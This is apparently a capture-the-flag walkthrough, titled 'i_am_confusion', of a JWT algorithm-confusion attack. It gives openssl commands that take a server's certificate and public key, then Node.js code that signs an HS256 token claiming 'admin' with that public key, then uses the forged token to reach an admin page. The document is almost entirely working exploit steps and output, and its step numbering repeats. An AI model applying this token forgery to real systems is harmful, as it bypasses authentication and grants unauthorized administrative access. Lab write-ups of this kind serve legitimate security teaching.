i_am_confusion
============

Step 1: Extract server's certificate
openssl s_client -connect 172.25.80.1:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem

Step 2: Convert the certificate to x509
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

Step 3: Convert the public key to be in RSA format
openssl rsa -inform PEM -in pubkey.pem -pubin -RSAPublicKey_out -outform PEM > pubkey.rsa

Step 3: Use node cli to sign JWT with the algorithm as HS256 and sign with the x509 public key

>node
> const jwt = require('jsonwebtoken')
> var fs = require('fs')
> var pub = fs.readFileSync('pubkey.rsa');
> token = jwt.sign({ 'user': 'admin' }, pub, { algorithm:'HS256' });
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjAzMzE2MzJ9.5pQCXHaYlVjVxXRpt58kBy_kQi94RBqRDeeqWlZh05g'

Step 4: Use the JWT token to get access to admin page

Step 5: Rejoice!
